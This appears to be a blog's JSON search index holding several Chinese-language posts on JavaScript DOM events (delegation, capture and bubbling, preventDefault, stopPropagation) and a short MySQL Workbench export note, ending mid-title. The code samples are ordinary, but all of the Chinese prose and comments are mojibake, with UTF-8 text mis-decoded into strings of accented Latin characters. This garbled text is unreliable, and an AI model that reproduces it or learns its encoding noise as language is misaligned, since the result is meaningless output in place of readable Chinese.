å‹•æ…‹ç”¢ç”Ÿçš„å…ƒç´ è¦æ€éº¼ç›£è½äº‹ä»¶ï¼Ÿ ç¬¬ä¸€å€‹å•é¡Œï¼æµªè²»è³‡æºå‡è¨­æœ‰ 1000 å€‹æŒ‰éˆ•éƒ½è¦æœ‰é»æ“Šäº‹ä»¶ï¼Œé‚£å°±è¦è¨­å®š 1000 å€‹ addEventListenerï¼š 123456789// 1000 å€‹æŒ‰éˆ•const buttons = document.querySelectorAll('.btn')// å¹«æ‰€æœ‰æŒ‰éˆ•åŠ ä¸Šç›£è½å™¨for (let i=0; i&lt;buttons.length; i++) { buttons[i].addEventListener('click', function() { console.log('click') } )} æœ‰æ²’æœ‰æ›´å¥½çš„åšæ³•ï¼Ÿ ç•¶ç„¶æœ‰ï¼Œè«‹ä½ å›æƒ³ã€Œäº‹ä»¶å‚³éæ©Ÿåˆ¶ã€ã€‚ ç•¶æˆ‘å€‘é»ä¸‹æŒ‰éˆ•æ™‚ï¼Œäº‹ä»¶æœƒå…ˆå¾ window ä¸€è·¯å‘ä¸‹å‚³éåˆ°çˆ¶å±¤ï¼Œå†åˆ°æŒ‰éˆ•ï¼ˆtargetï¼‰ï¼Œæ¥è‘—å†ä¸€è·¯å¾€ä¸Šå‚³å› windowã€‚ æ‰€ä»¥æŠŠç›£è½å™¨æ›åœ¨ã€ŒæŒ‰éˆ•çš„çˆ¶å±¤ã€ä¸Šä¸€æ¨£å¯ä»¥è§¸ç™¼äº‹ä»¶ï¼Œå› æ­¤ã€Œä¸€å€‹ã€addEventListener å°±å¤ äº†ã€‚ HTMLï¼š 12345678&lt;div class=\"div\"&gt; &lt;button class=\"btn\" data-number=\"1\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"2\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"3\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"4\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"5\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"6\"&gt;button&lt;/button&gt;&lt;/div&gt; 123456// åªè¦åœ¨ div ä¸­é»æ“Šéƒ½æœƒè¢«è§¸ç™¼çš„ç›£è½å™¨document.querySelector('div').addEventListener('click', function(e) { // å°å‡ºæŒ‰éˆ•çš„ç·¨è™Ÿ console.log(e.target.getAttribute('data-number'))}) ç¬¬äºŒå€‹å•é¡Œï¼å‹•æ…‹æ–°å¢çš„å…ƒç´ å¦‚æœè¦è®“å‹•æ…‹æ–°å¢çš„å…ƒç´ ä¹Ÿç›£è½äº‹ä»¶ï¼Œå°±å¾—åœ¨ã€Œæ–°å¢çš„åœ°æ–¹ã€åŠ ä¸Š addEventListenerã€‚ HTMLï¼š 12345&lt;div class=\"div\"&gt; &lt;button class=\"add-btn\"&gt;add button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"1\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-number=\"2\"&gt;button&lt;/button&gt;&lt;/div&gt; JavaScriptï¼š 123456789101112131415161718192021222324// çˆ¶ç¯€é»const parent = document.querySelector('div')// ç›®å‰æœ‰å¹¾å€‹æŒ‰éˆ•let currentButtonsCount = 2 // æ–°å¢æŒ‰éˆ•document.querySelector('.add-btn').addEventListener('click', function(e) { // æ›´æ–°æŒ‰éˆ•æ•¸é‡ currentButtonsCount++ // å»ºç«‹æ–°å…ƒç´  const element = document.createElement('button') // å¡«å…¥æ–‡å­— element.innerText = 'button' // åŠ ä¸Š class element.classList.add('btn') // åŠ ä¸Šç·¨è™Ÿ element.setAttribute('data-number', currentButtonsCount) // åŠ ä¸Šç›£è½å™¨ element.addEventListener('click', function(e) { console.log(e.target.getAttribute('data-number')) }) // æ’å…¥æ–°å…ƒç´  parent.appendChild(element) }) å¦‚æœæ²’æœ‰åŠ ä¸Šé€™ä¸€æ®µï¼š 123element.addEventListener('click', function(e) { console.log(e.target.getAttribute('data-number'))}) å‹•æ…‹æ–°å¢çš„æŒ‰éˆ•æ˜¯ä¸æœƒæœ‰ click æ•ˆæœçš„ã€‚ é€™æ¨£å­å¾ˆéº»ç…©ï¼Œè€Œä¸”åˆæœƒå›åˆ°ä¸€é–‹å§‹è¬›çš„å•é¡Œï¼ˆå¤ªæµªè²»è³‡æºï¼‰ï¼Œæ‰€ä»¥ä¸€æ¨£å¯ä»¥æ”¹ç”¨ delegation æ©Ÿåˆ¶ã€‚ å…ˆåŠ ä¸Šé€™æ®µï¼š 123456// ç›£è½ div åº•ä¸‹çš„æ‰€æœ‰æŒ‰éˆ•document.querySelector('div').addEventListener('click', function(e) { // å°å‡ºæŒ‰éˆ•çš„ç·¨è™Ÿ console.log(e.target.getAttribute('data-number'))}) åœ¨æ”¹ä¸€ä¸‹æ–°å¢æŒ‰éˆ•çš„éƒ¨åˆ†ï¼š 1234567891011121314151617181920// çˆ¶ç¯€é»const parent = document.querySelector('div')// ç›®å‰æœ‰å¹¾å€‹æŒ‰éˆ•let currentButtonsCount = 2 // æ–°å¢æŒ‰éˆ•document.querySelector('.add-btn').addEventListener('click', function(e) { // æ›´æ–°æŒ‰éˆ•æ•¸é‡ currentButtonsCount++ // å»ºç«‹æ–°å…ƒç´  const element = document.createElement('button') // å¡«å…¥æ–‡å­— element.innerText = 'button' // åŠ ä¸Š class element.classList.add('btn') // åŠ ä¸Šç·¨è™Ÿ element.setAttribute('data-number', currentButtonsCount) // æ’å…¥æ–°å…ƒç´  parent.appendChild(element) }) è£œå……ï¼è®“ delegation çš„å…ƒç´ ç›£è½æ•ç²è·Ÿå†’æ³¡æœ‰å·®å—ï¼Ÿåœ¨æ²’æœ‰è¨­å®š e.stopPropagation çš„æƒ…æ³ä¸‹æ˜¯æ²’å·®çš„ï¼Œä¸éä¸€æ¨£æœƒéµå¾ªã€Œå…ˆæ•ç²ï¼Œå†å†’æ³¡ã€çš„åŸå‰‡ï¼š 12345678&lt;div class=\"div\"&gt; &lt;button class=\"add-btn\"&gt;add button&lt;/button&gt; &lt;button class=\"btn\" data-index=\"1\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-index=\"2\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-index=\"3\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-index=\"4\"&gt;button&lt;/button&gt; &lt;button class=\"btn\" data-index=\"5\"&gt;button&lt;/button&gt;&lt;/div&gt; JavaScriptï¼š 123456789101112// è®“ div ç›£è½æ•ç²éšæ®µdocument.querySelector('div').addEventListener('click', function(e) { console.log('click capturing', e.target.getAttribute('data-index')) }, true)// è®“ div ç›£è½å†’æ³¡éšæ®µdocument.querySelector('div').addEventListener('click', function(e) { console.log('click bubbling', e.target.getAttribute('data-index')) }, false) åŠ ä¸Š e.stopPropagationï¼Œè™•æ–¼å†’æ³¡éšæ®µçš„ç›£è½å™¨å°±ä¸æœƒè¢«è§¸ç™¼ï¼š 1234567891011121314// è®“ div ç›£è½æ•ç²éšæ®µdocument.querySelector('div').addEventListener('click', function(e) { console.log('click capturing', e.target.getAttribute('data-index')) // é˜»æ­¢äº‹ä»¶å‚³é e.stopPropagation() }, true)// è®“ div ç›£è½å†’æ³¡éšæ®µdocument.querySelector('div').addEventListener('click', function(e) { console.log('click bubbling', e.target.getAttribute('data-index')) }, false)","link":"/2022/01/19/event-delegation/"},{"title":"äº‹ä»¶å‚³éæ©Ÿåˆ¶ï¼æ•ç²èˆ‡å†’æ³¡","text":"åˆ¥äººèªªä¸é›£ï¼Œä½†æˆ‘æ€éº¼è¦ºå¾—æœ‰é»é›£ã€‚ æŠŠä¸æ‡‚çš„åœ°æ–¹å¯«ä¸‹ä¾†æé†’è‡ªå·±æˆ‘æœƒææ··çš„é»æ‡‰è©²æ˜¯å› ç‚ºæ²’æœ‰ææ¸…æ¥šé€™ä»¶äº‹ï¼šä¸€å€‹ addEventListender åªå¯ä»¥ç›£è½ã€Œä¸€å€‹éšæ®µã€ åœ¨é è¨­çš„æƒ…æ³ä¸‹ addEventListender ç›£è½çš„æ˜¯ã€Œå†’æ³¡éšæ®µã€ï¼Œæ‰€ä»¥ä½ çµ•å°ä¸æœƒçœ‹åˆ°å¤–é¢çš„å…ƒç´ æ¯”è£¡é¢çš„å…ƒç´ é‚„è¦æ—©è¢«è§¸ç™¼ï¼Œå› ç‚ºå¤§å®¶éƒ½æ˜¯ç›£è½å†’æ³¡éšæ®µã€‚ä¹Ÿå°±æ˜¯èªªå¤–é¢çš„å…ƒç´ ä¸€å®šè¦ç­‰åˆ° Target Phase çµæŸä¹‹å¾Œï¼Œé€²åˆ°å†’æ³¡éšæ®µå¾€ä¸Šå‚³æ‰æœƒä¸€å€‹ä¸€å€‹è¢«è§¸ç™¼ã€‚ é‚£ä½ è¦æ€éº¼è®“å¤–é¢çš„å…ƒç´ å…ˆè¢«è§¸ç™¼ï¼Ÿè®“å®ƒç›£è½æ•ç²éšæ®µ å¤§æ¦‚ç°¡å–®ä¾†èªªå°±æ˜¯é€™æ¨£å­å§â€¦ äº‹ä»¶çš„å‚³éæµç¨‹äº‹ä»¶çš„å‚³éæ©Ÿåˆ¶å…¶å¯¦åˆ†æˆã€Œå†’æ³¡ã€è·Ÿã€Œæ•ç²ã€ï¼Œåƒè€ƒé€™å¼µåœ–ï¼š æ„æ€æ˜¯èªªï¼Œç•¶ä½ é»ä¸‹ &lt;td&gt; æ™‚ï¼Œäº‹ä»¶æœƒå…ˆå¾ window ä¸€è·¯å‚³ä¸‹ä¾†ï¼Œæ¥è‘—åˆ°äº† &lt;td&gt; å¾Œï¼Œåœ¨ä¸€è·¯å‚³å›å»ã€‚ å¾ window åˆ° &lt;td&gt; çš„é€™ä¸€æ®µå«åšã€Œæ•ç²éšæ®µï¼ˆCapture phaseï¼‰ã€ åœ¨ &lt;td&gt; åˆ° window çš„é€™ä¸€æ®µå«åšã€Œå†’æ³¡éšæ®µï¼ˆBubbling Phaseï¼‰ã€ è‡³æ–¼ã€ŒTarget Phaseã€å°±æ˜¯è§¸ç™¼äº‹ä»¶çš„é‚£å€‹å…ƒç´ ï¼Œå› ç‚ºå®ƒæ˜¯ç›®æ¨™ï¼Œæ‰€ä»¥æ²’æœ‰åˆ†å†’æ³¡æˆ–æ•ç² æ‰€ä»¥å¾ä¸Šåœ–å¯ä»¥çŸ¥é“äº‹ä»¶çš„å‚³éæ©Ÿåˆ¶æ˜¯ï¼šå…ˆæ•ç²ï¼Œåœ¨å†’æ³¡ æˆ‘å€‘å¯ä»¥ä¾†å¯¦ä½œçœ‹çœ‹å°±çŸ¥é“äº†ï¼š 12345&lt;div class=\"outter\"&gt; &lt;div class=\"inner\"&gt; &lt;button class=\"btn\"&gt;btn&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; 12345678910111213141516171819// ç›£è½æ•ç²éšæ®µfunction addEventCapturing(selector) { document.querySelector(selector) .addEventListener('click', function(e) { console.log(selector, 'æ•ç²') }, true)}// ç›£è½å†’æ³¡éšæ®µfunction addEventBubbling(selector) { document.querySelector(selector) .addEventListener('click', function(e) { console.log(selector, 'å†’æ³¡') }, false)}// è®“ outter ç›£è½æ•ç²éšæ®µ// é æœŸé †åºï¼š outter -&gt; btn -&gt; inneraddEventBubbling('.btn')addEventBubbling('.inner')addEventCapturing('.outter') åˆ»æ„è¨­æˆé€™æ¨£çš„ç”¨æ„æ˜¯ç‚ºäº†è®“ä½ ç†è§£ï¼Œåªè¦è®“å¤–é¢çš„å…ƒç´ ç›£è½ã€Œæ•ç²ã€ï¼Œå®ƒå°±å¯ä»¥æ¯”è£¡é¢æ—©è¢«è§¸ç™¼ã€‚ Outputï¼š 123.outter æ•ç².btn å†’æ³¡.inner å†’æ³¡ æ¥è‘—è®“æ¯å€‹å…ƒç´ éƒ½åŒæ™‚ç›£è½ã€Œæ•ç²ã€èˆ‡ã€Œå†’æ³¡ã€éšæ®µï¼š 12345678910111213141516function addEventBoth(selector) { // è¨­ç½®ç›£è½å™¨ï¼ˆè½å†’æ³¡éšæ®µï¼‰ document.querySelector(selector) .addEventListener('click', function() { console.log(selector, 'å†’æ³¡') }, false) // è¨­ç½®ç›£è½å™¨ï¼ˆè½æ•ç²éšæ®µï¼‰ document.querySelector(selector) .addEventListener('click', function() { console.log(selector, 'æ•ç²') }, true)}// è®“æ¯å€‹å…ƒç´ åŒæ™‚ç›£è½å…©å€‹éšæ®µaddEventBoth('.btn')addEventBoth('.inner')addEventBoth('.outter') Outputï¼š 123456.outter æ•ç².inner æ•ç².btn æ•ç².btn å†’æ³¡.inner å†’æ³¡.outter å†’æ³¡ è£œå……ï¼åœ¨ Target Phase ä¸­çš„æ•ç²èˆ‡å†’æ³¡[FE102] ä¸­æåˆ°ï¼Œå¦‚æœåœ¨ Target Phase åŒæ™‚ç›£è½æ•ç²èˆ‡å†’æ³¡éšæ®µï¼Œé€™æ™‚å€™æœƒæ ¹æ“š addEventListener çš„ã€Œè¨­å®šé †åºã€ä¾†åŸ·è¡Œï¼Œå› æ­¤ç…§é€™å€‹é‚è¼¯åº•ä¸‹æ‡‰è©²è¦è¼¸å‡ºï¼šå†’æ³¡ -&gt; æ•ç² 12345678910111213141516function addEventBoth(selector) { // è¨­ç½®ç›£è½å™¨ï¼ˆè½å†’æ³¡éšæ®µï¼‰ document.querySelector(selector) .addEventListener('click', function() { console.log(selector, 'å†’æ³¡') }, false) // è¨­ç½®ç›£è½å™¨ï¼ˆè½æ•ç²éšæ®µï¼‰ document.querySelector(selector) .addEventListener('click', function() { console.log(selector, 'æ•ç²') }, true) }// è®“æ¯å€‹å…ƒç´ åŒæ™‚ç›£è½å…©å€‹éšæ®µ// é æœŸçµæœï¼š .btn å†’æ³¡ -&gt; .btn æ•ç²addEventBoth('.btn') ä½†å¯¦æ¸¬ç™¼ç¾é€™éƒ¨åˆ†ä¼¼ä¹æœ‰è¢«ä¿®æ­£éï¼Œæ‰€ä»¥ä¸€æ¨£æœƒéµå®ˆã€Œå…ˆæ•ç²ï¼Œåœ¨å†’æ³¡ã€çš„é€™å€‹åŸå‰‡ï¼š 12.btn æ•ç².btn å†’æ³¡","link":"/2022/01/18/event-flow/"},{"title":"preventDefault çš„å°çŸ¥è­˜","text":"å¯«ä¸‹ä¾†æ€•ä»¥å¾Œå¿˜è¨˜ã€‚ æé†’è«‹å…ˆç†è§£ äº‹ä»¶å‚³éæ©Ÿåˆ¶ï¼æ•ç²èˆ‡å†’æ³¡ï¼Œä¸ç„¶ä¿è­‰ä½ çœ‹ä¸æ‡‚ã€‚ ç°¡è¿°preventDefault çš„ä½œç”¨æ˜¯ç”¨ä¾†é˜»æ­¢å…ƒç´ çš„é è¨­è¡Œç‚ºï¼Œä½†å®ƒæœ‰å€‹ç‰¹åˆ¥çš„åœ°æ–¹åœ¨æ–¼åªè¦ call äº†é€™å€‹ functionï¼Œé€™å€‹æ•ˆæœå°±æœƒæŒ‰ç…§ã€Œäº‹ä»¶å‚³éæ©Ÿåˆ¶ã€ä¾†å‚³éä¸‹å»ã€‚ å°±æ˜¯å¦‚æœåœ¨ window çš„ã€Œæ•ç²éšæ®µã€å‘¼å« preventDefaultï¼Œé‚£ä¸‹é¢çš„ &lt;div&gt; è·Ÿ &lt;a&gt; ä¹Ÿæœƒåƒåˆ°æ•ˆæœã€‚ å‚™è¨»ï¼š æˆ‘å¾Œä¾†ç™¼ç¾ä¸ç®¡ window æ˜¯åœ¨ã€Œæ•ç²éšæ®µã€æˆ–ã€Œå†’æ³¡éšæ®µã€å‘¼å« preventDefaultï¼Œ&lt;div&gt; è·Ÿ &lt;a&gt; éƒ½ä¸€æ¨£æœƒè¢«å½±éŸ¿ã€‚æ‰€ä»¥æ­£ç¢ºä¾†èªªæ‡‰è©²æ˜¯ã€Œåªè¦åœ¨åŒä¸€æ¢éˆä¸Šã€ï¼Œé€™æ¢éˆä¸Šçš„æ‰€æœ‰å…ƒç´ éƒ½æœƒè¢«é˜»æ­¢é è¨­è¡Œç‚ºã€‚ å¯¦ä¾‹ç›´æ¥å¯¦åšå°±æ¯”è¼ƒå¥½æ‡‚äº†ï¼š 123&lt;div&gt; &lt;a href=\"abc.com\"&gt;link&lt;/a&gt;&lt;/div&gt; 1234// åœ¨ window çš„æ•ç²éšæ®µå‘¼å« preventDefaultwindow.addEventListener('click', function(e) { e.preventDefault()}, true) è£œå……ï¼å‚³éæ²’æœ‰åˆ†éšæ®µæŠŠå‰›å‰›çš„ä¾‹å­æ”¹å¯«æˆé€™æ¨£ï¼Œæ•ˆæœæ˜¯ä¸€æ¨£çš„ï¼š 1234// åœ¨ window çš„å†’æ³¡éšæ®µå‘¼å« preventDefaultwindow.addEventListener('click', function(e) { e.preventDefault()}, false) ä¸ç®¡ window æ˜¯åœ¨ã€Œå†’æ³¡ã€æˆ–ã€Œæ•ç²ã€è§¸ç™¼ preventDefaultï¼ŒåŒä¸€æ¢äº‹ä»¶éˆä¸Šçš„å…ƒç´ éƒ½æœƒè¢«å½±éŸ¿ã€‚ åªæœ‰ ä¸åœ¨åŒå€‹äº‹ä»¶éˆä¸Šçš„å…ƒç´  æ‰ä¸æœƒè¢«å½±éŸ¿åˆ°ï¼Œä¾‹å¦‚èªªï¼š 1234&lt;div class=\"div\"&gt; &lt;a class=\"btn\" href=\"abc.com\"&gt;link&lt;/a&gt; &lt;a class=\"btn\" href=\"abc.com\"&gt;link&lt;/a&gt;&lt;/div&gt; JavaScriptï¼š 12345678910111213// ç¬¬ä¸€å€‹æŒ‰éˆ•document.querySelectorAll('.btn')[0] .addEventListener('click', function(e) { // é˜»æ­¢é è¨­è¡Œç‚º e.preventDefault() console.log('only I can stop!!!') }, false)// ç¬¬äºŒå€‹æŒ‰éˆ•document.querySelectorAll('.btn')[1] .addEventListener('click', function(e) { alert('oh no~') }, false) å¤§æ¦‚å¯ä»¥æƒ³æˆæ˜¯é€™æ¨£çš„é—œä¿‚ï¼š","link":"/2022/01/19/event-prevent-default-extension/"},{"title":"é˜»æ­¢é è¨­è¡Œç‚º preventDefaut","text":"ä¸€å®šè¦çŸ¥é“çš„æ±è¥¿ã€‚ ç°¡è¿°æœ‰äº› HTML å…ƒç´ æœƒè‡ªå·±çš„é è¨­è¡Œç‚ºï¼Œä¾‹å¦‚èªªï¼š &lt;form&gt; æŒ‰ä¸‹ type=submit çš„æŒ‰éˆ•æ™‚æœƒé€å‡ºè¡¨å–® &lt;a&gt; æŒ‰ä¸‹æ™‚æœƒè‡ªå‹•è·³è½‰åˆ°é€£çµçš„ä½ç½® &lt;input&gt; æŒ‰ä¸‹éµç›¤æœƒå‡ºç¾è¼¸å…¥çš„å­— è€Œ event.preventDefault çš„ä½œç”¨å°±æ˜¯ç”¨ä¾†é˜»æ­¢é€™äº›é è¨­è¡Œç‚ºã€‚ ä»¥è¡¨å–®ä¾†èˆ‰ä¾‹HTMLï¼š 123456 &lt;form class=\"block\"&gt; name: &lt;input type=\"text\" name=\"username\"&gt; password: &lt;input type=\"password\" name=\"password1\"&gt; password again:&lt;input type=\"password\" name=\"password2\"&gt; &lt;button&gt;Submit&lt;/button&gt;&lt;/form&gt; JavaScriptï¼š 123456789101112// æŒ‰éˆ•const form = document.querySelector('form')// ç›£è½ submit äº‹ä»¶form.addEventListener('submit', function(e) { const pwd1 = document.querySelector('input[name=password1]') const pwd2 = document.querySelector('input[name=password2]') // å¦‚æœå¯†ç¢¼ä¸ä¸€è‡´å°±ä¸é€å‡ºè¡¨å–® if (pwd1.value !== pwd2.value) { alert('å¯†ç¢¼ä¸ä¸€è‡´') return e.preventDefault() }}) ä½ ä¹Ÿå¯ä»¥è‡ªå·±è©¦çœ‹çœ‹å…¶ä»–çš„å…ƒç´ ï¼Œåƒæ˜¯ä¸è¦è®“ &lt;a&gt; è·³è½‰æˆ–æ˜¯ &lt;input&gt; æ²’è¾¦æ³•è¼¸å…¥å…§å®¹ã€‚","link":"/2022/01/18/event-prevent-default/"},{"title":"é˜»æ­¢äº‹ä»¶å‚³é stopPropagation","text":"åˆ¥è®“ä¸Šé¢æˆ–ä¸‹é¢çš„äººçŸ¥é“ï¼ æé†’çœ‹ä¸æ‡‚å°±ä»£è¡¨ä½ ä¸€å®šæ²’ææ¸…æ¥šäº‹ä»¶çš„ã€Œå‚³éæµç¨‹ã€ï¼Œç½°ä½ å›å»å†çœ‹ä¸€æ¬¡ï¼šäº‹ä»¶å‚³éæ©Ÿåˆ¶ï¼æ•ç²èˆ‡å†’æ³¡ é˜»æ­¢å‘ä¸Šå‚³éï¼ˆä¸è¦è®“å®ƒå¾€ä¸Šå†’æ³¡ï¼‰ä»¥ä¸‹åˆ†åˆ¥ç¤ºç¯„ï¼Œã€Œé˜»æ­¢ã€èˆ‡ã€Œä¸é˜»æ­¢ã€çš„å·®ç•°ã€‚ HTMLï¼š 12345&lt;div class=\"outter\"&gt; &lt;div class=\"inner\"&gt; &lt;button class=\"btn\"&gt;btn&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; å…ˆç¤ºç¯„ç¬¬ä¸€ç¨®ï¼Œåœ¨æ²’æœ‰é˜»æ­¢äº‹ä»¶å‚³éæ™‚æ‡‰è©²æ˜¯é€™æ¨£å­ï¼š 123456789101112// ç›£è½å†’æ³¡éšæ®µfunction addEventBubbling(selector) { document.querySelector(selector) .addEventListener('click', function(e) { console.log(selector, 'å†’æ³¡') }, false)}// å…¨éƒ¨éƒ½ç›£è½å†’æ³¡éšæ®µ click äº‹ä»¶addEventBubbling('.outter')addEventBubbling('.inner')addEventBubbling('.btn') Outputï¼š 123.btn å†’æ³¡.inner å†’æ³¡.outter å†’æ³¡ ç¾åœ¨è®“ .btn å†åŠ ä¸Šä¸€å€‹äº‹ä»¶ä¾†ã€Œé˜»æ­¢äº‹ä»¶å‚³éã€ï¼Œçµæœå°±ä¸ä¸€æ¨£ï¼š 1234567891011121314151617// ç›£è½å†’æ³¡éšæ®µfunction addEventBubbling(selector) { document.querySelector(selector) .addEventListener('click', function(e) { console.log(selector, 'å†’æ³¡') }, false)}// btn é¡å¤–è¨­ç«‹ä¸€å€‹é˜»æ­¢å‚³éçš„äº‹ä»¶document.querySelector('.btn') .addEventListener('click', function(e) { // é˜»æ­¢äº‹ä»¶å‚³é e.stopPropagation() }, false)addEventBubbling('.outter')addEventBubbling('.inner')addEventBubbling('.btn') 1.btn å†’æ³¡ é˜»æ­¢å‘ä¸Šå‚³éï¼ˆä¸è¦è®“å®ƒå¾€ä¸‹æ•ç²ï¼‰è·Ÿå‰›å‰›ä¸€æ¨£ï¼Œå·®åˆ¥åœ¨æ–¼ä¸€å€‹æ˜¯åœ¨ã€Œå†’æ³¡éšæ®µã€é˜»æ­¢ï¼Œä¸€å€‹æ˜¯åœ¨ã€Œæ•ç²éšæ®µã€é˜»æ­¢ã€‚ å…ˆç¤ºç¯„ä¸€å€‹éŒ¯èª¤çš„ç¯„ä¾‹ï¼š 12345678910// outter ç›£è½å†’æ³¡éšæ®µdocument.querySelector('.outter') .addEventListener('click', function(e) { // é˜»æ­¢äº‹ä»¶å‚³é e.stopPropagation() }, false)// ä»¥ä¸‹ç›£è½å†’æ³¡éšæ®µaddEventBubbling('.btn')addEventBubbling('.inner') æ€éº¼æ²’æœ‰ç”¨ï¼Ÿå› ç‚ºä½ æ²’ææ¸…æ¥šé †åºã€‚è§¸ç™¼çš„é †åºæ˜¯ï¼š .btn -&gt; .inner -&gt; outter æ‰€ä»¥åœ¨ .outter é˜»æ­¢äº‹ä»¶å‚³éçš„æ™‚å€™ .btn è·Ÿ .inner æ—©å°±å·²ç¶“è¢«è§¸ç™¼å®Œäº†ã€‚ æ­£ç¢ºçš„ä½œæ³•æ˜¯è®“ .outter åœ¨ã€Œæ•ç²éšæ®µã€å°±é˜»æ­¢äº‹ä»¶å‚³éï¼š 12345678910// outter ç›£è½æ•ç²éšæ®µdocument.querySelector('.outter') .addEventListener('click', function(e) { // é˜»æ­¢äº‹ä»¶å‚³é e.stopPropagation() }, true)// ä»¥ä¸‹ç›£è½å†’æ³¡éšæ®µaddEventBubbling('.btn')addEventBubbling('.inner') é€™æ™‚å€™ä¸ç®¡æ€éº¼é»éƒ½ä¸æœƒè§¸ç™¼ï¼Œå› ç‚º .outter åœ¨ã€Œæ•ç²éšæ®µã€å°±è®“äº‹ä»¶åœæ­¢å‘ä¸‹å‚³éã€‚ è£œå…… stopImmediatePropagationé¦–å…ˆè¦çŸ¥é“ä¸€å€‹å…ƒç´ æ˜¯å¯ä»¥è¨­å®šå¤šå€‹ addEventListener çš„ã€‚ å‡è¨­æœ‰å€‹å…ƒç´ åŒæ™‚ç¶äº†å…©å€‹ç›£è½å™¨ï¼ˆclickï¼‰ï¼š clickA clickB å¦‚æœæˆ‘æƒ³åœ¨ clickA è§¸ç™¼æ™‚é˜»æ­¢äº‹ä»¶å‚³éåˆ° clickBï¼Œé€™æ™‚å€™æ²’è¾¦æ³•ç”¨ stopPropagation ä¾†é˜»æ­¢ï¼Œå› ç‚ºé€™å…©å€‹äº‹ä»¶éƒ½ç¶åœ¨åŒå€‹å…ƒç´ ï¼ˆå±¤ç´šï¼‰ä¸Šã€‚ é€™æ™‚å€™å¾—ç”¨ stopImmediatePropagationï¼Œåœ¨ clickA è§¸ç™¼çš„æ™‚å€™åŸ·è¡Œï¼Œé€™æ¨£ clickB å°±ä¸æœƒè¢«è§¸ç™¼äº†ã€‚ å…ˆç¤ºç¯„ stopPropagation çš„æƒ…æ³ï¼š 1234567891011121314151617function clickA(selector) { document.querySelector('.btn') .addEventListener('click', function(e) { console.log('clickA') // åœ¨ A é˜»æ­¢äº‹ä»¶å‚³é e.stopPropagation() }, false)}function clickB(selector) { document.querySelector('.btn') .addEventListener('click', function(e) { console.log('clickB') }, false)}// åœ¨ .btn ç›£è½å…©å€‹äº‹ä»¶ï¼ˆå†’æ³¡éšæ®µï¼‰clickA('.btn')clickB('.btn') clickB ä¸€æ¨£æœƒè¢«è§¸ç™¼ï¼š æ”¹ç”¨ stopImmediatePropagationï¼š 1234567891011121314151617function clickA(selector) { document.querySelector('.btn') .addEventListener('click', function(e) { console.log('clickA') // åœ¨ A ç«‹å³é˜»æ­¢äº‹ä»¶å‚³é e.stopImmediatePropagation() }, false)}function clickB(selector) { document.querySelector('.btn') .addEventListener('click', function(e) { console.log('clickB') }, false)}// åœ¨ .btn ç›£è½å…©å€‹äº‹ä»¶ï¼ˆå†’æ³¡éšæ®µï¼‰clickA('.btn')clickB('.btn') é€™æ™‚å€™ clickB å°±ä¸æœƒè¢«è§¸ç™¼äº†ï¼š æœ€å¾Œåšå¹¾å€‹è£œå……ï¼š æ³¨æ„è¨­å®šç›£è½å™¨çš„é †åº åœ¨ä¸€å€‹å…ƒç´ ä¸Šç¶å®šå¤šå€‹äº‹ä»¶æ™‚ï¼ŒæœƒæŒ‰ç…§ã€Œç¶å®šçš„é †åºã€ä¾†è§¸ç™¼ï¼Œä»¥å‰é¢çš„ä¾‹å­ä¾†èªªå°±æ˜¯ï¼š clickA -&gt; clickB å¦‚æœç¾åœ¨ä½ æŠŠè¨­å®šé †åºæ”¹æˆ clickB -&gt; clickAï¼Œé€™æ™‚å€™ stopImmediatePropagation å°±æ²’æœ‰ä½œç”¨ï¼Œå› ç‚ºåœ¨ stopImmediatePropagation åŸ·è¡Œå‰ clickB æœƒåœ¨é‚£å·²ç¶“å…ˆè¢«è§¸ç™¼äº†ã€‚ æ³¨æ„ç›£è½çš„æ˜¯å“ªå€‹éšæ®µ å…¶å¯¦å¦‚æœä½ æŠŠ clickA æ”¹æˆç›£è½ã€Œæ•ç²éšæ®µã€ï¼Œé‚£ stopPropagation ä¸€æ¨£å¯ä»¥é˜»æ­¢ clickB è¢«è§¸ç™¼ï¼Œæˆ‘æƒ³æ˜¯å› ç‚ºã€Œå…ˆæ•ç²ï¼Œåœ¨å†’æ³¡ã€é€™å€‹å‚³éæ©Ÿåˆ¶çš„é—œä¿‚ã€‚","link":"/2022/01/19/event-stop-propagation/"},{"title":"ç”¨ Workbench è¼¸å‡ºå’Œè¼¸å…¥ MySQL è³‡æ–™","text":"éš¨æ‰‹è¨˜ä¸€ä¸‹ã€‚ ç°¡è¿°é€™é‚Šæˆ‘æ‡¶å¾—æ‹ä¸€å †åœ–ç‰‡ï¼Œæ‰€ä»¥åªè¬›æµç¨‹ï¼Œæƒ³çœ‹åœ–çš„è©±å¯ä»¥åƒè€ƒ é€™ç¯‡ã€‚ è¼¸å‡ºæµç¨‹ å¾å·¥å…·åˆ—é¸ Server -&gt; Data Exportï¼Œæœƒè‡ªå‹•å½ˆå‡ºæ–°è¦–çª— æŠŠä½ æƒ³è¼¸å‡ºçš„ Database å’Œ Table å‹¾èµ·ä¾† åˆ°ä¸‹é¢çš„ Export Options è¨­å®šè¼¸å‡ºæ–¹å¼å’Œä½ç½®ï¼ŒExport to Dump Project Folder å’Œ Export to Self-Contained File åªå·®è¦ã€ŒåŒ…åœ¨ä¸€èµ·ã€é‚„æ˜¯ã€Œæ‹†æˆä¸€å€‹ä¸€å€‹ã€ï¼Œé€™é‚Šå°±çœ‹éœ€æ±‚ä¾†é¸ã€‚ æœ€å¾ŒæŒ‰ä¸‹ Start Export å°±å¥½äº† è¼¸å…¥æµç¨‹ æ‰“é–‹ä¸€å€‹ä¸‹ Query çš„è¦–çª— æŠŠè¼¸å‡ºå¥½çš„æª”æ¡ˆå…§å®¹å…¨éƒ¨è²¼é€²å» æœ€å¾ŒæŒ‰ä¸‹åŸ·è¡Œï¼ˆé–ƒé›» iconï¼‰ é‡æ–°æ•´ç†çœ‹æœ‰æ²’æœ‰æˆåŠŸå°± OK äº†","link":"/2022/03/30/export-mysql-database-by-workbench/"},{"title":"MySQL 